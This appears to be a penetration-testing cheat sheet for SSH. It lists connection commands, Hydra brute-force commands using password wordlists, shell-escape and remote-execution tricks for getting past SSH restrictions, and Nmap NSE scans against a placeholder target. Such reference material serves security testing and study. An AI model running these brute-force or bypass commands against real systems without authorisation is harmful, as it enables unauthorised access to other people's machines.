### **Introduction**

SSH (Secure Shell) is a protocol for secure remote access and file transfer between systems. It encrypts all communications, protecting against eavesdropping and attacks. SSH uses a client-server model and supports both password and key-based authentication.

### **SSH Connection Management**

Use the following commands to establish SSH connections.

| Connection Type | Command | Description |
| --- | --- | --- |
| Password Auth | `ssh -p 22 [USERNAME]@[TARGET-IP]` | Connects to an SSH server using password. |
| Private Key Auth | `chmod 600 PATH/TO/PRIVATE-KEY` then `ssh -i PATH/TO/PRIVATE/KEY [USERNAME]@[TARGET-IP]` | Sets the correct permissions for a private key and uses it to establish an SSH connection. |

### **Brute-Forcing SSH Credentials**

Hydra can be used to brute-force SSH logins under different scenarios:

| Scenario | Command |
| --- | --- |
| Unknown User | `hydra -L user.txt -p "Password" -f [TARGET-IP] ssh` |
| Unknown Password | `hydra -l user -P /opt/rockyou.txt -f [TARGET-IP] ssh` |
| Unknown User and Password | `hydra -L user.txt -P /opt/rockyou.txt -f [TARGET-IP] ssh` |
| Different Port | `hydra -l user -P /opt/rockyou.txt -f [TARGET-IP] ssh -s 9999` |

### **Bypassing SSH Restrictions**

Useful techniques for executing commands or scripts over SSH:

| Scenario | Command |
| --- | --- |
| Escaping to Another Shell | `sshpass -p '[PASSWORD]' ssh [USERNAME]@[TARGET-IP] -t bash` |
| Remote Command Execution | `ssh [USERNAME]@[TARGET-IP] 'echo "[COMMAND-HERE]"'` |
| Execute Local Script Remotely | `ssh [USERNAME]@[TARGET-IP] 'bash -s' < /path/to/local_script.sh` |

### **Nmap NSE Scripts for SSH**

Nmap NSE scripts specifically designed for SSH to discover vulnerabilities or gather information.

| Task | Command | Description |
| --- | --- | --- |
| Discovering SSH-related Scripts | `ls /usr/share/nmap/scripts/ \| grep "ssh"` | Lists all Nmap NSE scripts related to SSH. This helps in selecting the appropriate scripts for targeted SSH testing. |
| Run SSH NSE Scripts | `nmap -p 22 --script ssh* [TARGET-IP]` | Executes SSH-related Nmap scripts against a target IP on port 22 for comprehensive vulnerability scanning and information gathering. |
